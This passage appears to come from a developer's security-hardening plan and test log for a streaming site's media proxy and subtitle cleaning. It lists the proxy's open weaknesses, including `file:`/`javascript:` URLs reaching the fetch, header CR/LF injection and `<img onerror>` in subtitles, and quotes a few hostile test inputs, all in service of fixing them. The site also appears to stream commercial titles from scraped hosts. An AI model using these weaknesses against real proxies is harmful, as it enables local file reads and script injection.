- Open in both: upstream HTML/JS/SVG served with their own type, no `nosniff`/sandbox CSP, disguised TS segment served as `image/jpeg`, internal error text in 502 bodies, `file:`/`ftp:`/`javascript:`/`data:` targets reach the fetch (on the edge the runtime itself rejects non-http schemes; locally `file:` is real), CR/LF in `referer` not refused, 6 MB playlist buffered, relative lines resolved against the first address after a redirect. Production only: passes `Set-Cookie`, `Refresh`, `Link`, `Service-Worker-Allowed`; VTT `<img onerror>` untouched; upstream error pages passed through.
- T13: `python tools/check_deployment.py https://tvzinhaonline.pages.dev` passed on 2026-10-12 (blocked paths 404, data and assets served).
- Keep these files out of the public repository until Phase 1 ships (the cases describe the open attacks).

## Phase 1 result (2026-10-12, branch `feat/security-hardening`, not committed)

- `stream.js` and `local_server.py` (`handle_stream` + `fetch_upstream`/`upstream_open`/`clean_vtt`/`stream_media_type`/`read_capped`): http/https only and no CR/LF in `referer`/`origin` (400 before any request); redirects followed one by one (max 5, each address checked again; playlist lines resolved against the final address); answers built from scratch: CORS (kept for casting) + `X-Content-Type-Options: nosniff` + `Content-Security-Policy: sandbox; default-src 'none'`, media types kept (`video/*`, `audio/*`, `application/mp4`, octet-stream), others by extension (`.ts` -> `video/mp2t`, `.mp4`/`.m4s` -> `video/mp4`) else `application/octet-stream`; only `Content-Length`/`Content-Range`/`Accept-Ranges` copied; upstream 4xx/5xx keep the status with a short `upstream_error` body; network errors -> 502 `{"error":"upstream_failed"}` (details in the server log); playlists and VTT read up to 5 MB (else 502); 15 s for upstream headers. WebVTT cleanup on both sides keeps `<i>`, `<b>`, `<u>` (decision 6), drops other tags, escapes stray `<`/`>`; timing lines untouched. Unified referer/origin rules (googlevideo referer and `origin` param locally; zoko Origin whenever the referer is zoko, as the resolver's probe does). HEAD no longer adds `Range: bytes=0-0` locally (same as production).
- `tools/test_stream_proxy.py --strict`: 26 cases (8 positive, 18 negative), production 26/26 and local 26/26 (baseline was 5/21 and 8/21). Added cases: VTT keeps i/b/u, tag split over two lines, redirect to `file:`, zoko Origin, `.ts` sent as text/html -> `video/mp2t`.
- Real playback through the local server (Python side; `stream.js` itself only runs on Cloudflare, so a preview deploy is needed for the edge): `player_benchmark.mjs` Friends T1E1/E2, Breaking Bad T1E1 (proxied HLS), Robo Selvagem, Zootopia 2, O Estranho Mundo de Jack (direct MP4): Firefox 6/6; Edge 4/6 then the 2 failures (no resolve answer, MGEB timing) played on the rerun 2/2. `player_ui_check.mjs` Chrome 46/46 on the second run (first run 45/46: FMA:B subtitle menu read before the player was ready; the resolve gave pt-BR default and the VTT came through the proxy as `text/vtt` with italics kept). Firefox anime: FMA:B and DBZ T1E1 play on the anime player through the proxy, VTT loaded, Português (Brasil).

### Phase 1 on the preview (2026-10-12, commit `a25d41c` on `feat/security-hardening`, preview `feat-security-hardening.tvzinhaonline.pages.dev`)

- Pushed: `stream.js` and `local_server.py` only (tests, fixtures and this plan stay local until production is fixed).
- `check_deployment.py <preview>`: ALL PASSED. `/api/stream?url=file:...` -> 400; `?url=https://example.com/` -> `application/octet-stream` + `nosniff` + `sandbox; default-src 'none'` + CORS `*`, no Set-Cookie (production still answers `text/html` without them).
- Playback on the preview, Chrome and Firefox, each also seeked to 10:00 and resumed: Friends T1E1, Breaking Bad T1E1, Jujutsu Kaisen T1E41 (main player, proxied HLS), FMA:B T1E1 (anime player, proxied HLS + VTT `text/vtt`, nosniff, 254 cues, italics kept, Português (Brasil)): 4/4 in each browser (a first run was invalid: it measured the previous player; the script now waits for the new header and player). Movies (benchmark copy pointed at the preview): Robo Selvagem, Zootopia 2, Divertida Mente 2, Deadpool & Wolverine, proxied HLS: Edge 4/4, Firefox 4/4.
- Firefox console errors on the preview (6-7 per title, 0 on production): all from Cloudflare Web Analytics (`cloudflareinsights.com/cdn-cgi/rum` 404 + CORS) refusing the preview hostname; unrelated to the proxy.
- Zootopia 2 in Firefox: one failover on 1 of 3 runs, reason "timeout" on source 1 (s3-z20.97bf1.com 1080p HLS). Same source through the new and the old proxy, 3 rounds: playlist ~350 ms and next file 1.4-1.6 s on both; the host is slow to start sometimes, independently of the change.

## Phase 3 result (2026-10-12, branch `feat/subtitle-safety`, not committed)

- Analysis: subtitles reach the player only from the anime host, always through `/api/stream` (resolve.js builds them on the proxy), which cleans them since Phase 1. The open risk was a subtitle that does not come through the proxy (the planned external subtitle files): Artplayer draws cue text as HTML (`escape: false`, needed for italics). Artplayer 5.1.7 runs `subtitle.onVttLoad` on the text after converting SRT/ASS to WebVTT, but only when the subtitle `type` is known (a URL without extension skips it).
- Change (`engine.js`): `cleanSubtitleVtt` (same rules as `stream.js` `cleanVtt`: `<i>`, `<b>`, `<u>` kept, other tags dropped, stray brackets escaped, timing lines untouched) as `onVttLoad`, inside `NATIVE_SUBTITLE_OPTIONS` (type vtt, escape false, style) which every player now gets, also when it starts with subtitles off. That also fixes a subtitle turned on later from the menu, which used Artplayer's defaults and showed "<i>" as text. `escape: false` kept (decision 6). Cache version `20261012_1901`.
- `tools/subtitle_safety_check.mjs`: 7 rule cases, player and proxy give identical results; a harmful subtitle made in the page (blob, never through the proxy) on a real movie: nothing runs, italics drawn; subtitles off by preference then turned on from the menu: italics drawn, nothing runs. Chrome 19/19 (on the second run: the first one the movie did not start in 80 s, slow MP4 host), Firefox 19/19. Negative control: with the player cleaning disabled, the same test caught the code running (an `<img onerror>` created, `window.__xss` set).
- Regression: `player_ui_check.mjs` Chrome 46/46 (FMA:B starts on Português (Brasil)); Firefox anime check: FMA:B and DBZ play on the anime player with the subtitle loaded, Português (Brasil).
- External subtitles (future feature): they must pass the file type (srt/vtt/ass) to `art.subtitle.switch` so Artplayer converts and this cleaning runs; sync offset is unaffected; colors (`<font color>`) and ASS styles are dropped (could allow color only, safely, later).

## Out of scope

- Implementing D3 (postponed), rewriting git history.
- Publishing a `dist/` folder instead of the repository root (cleaner than the path block; possible later).
- Paid Cloudflare features (WAF rules, Rate Limiting binding), accounts/login.
- Expanding MGEB/iframe scraping or per-host patches.
- Changes to `fetch_matches.py` beyond what D4 escaping already covers on the client.
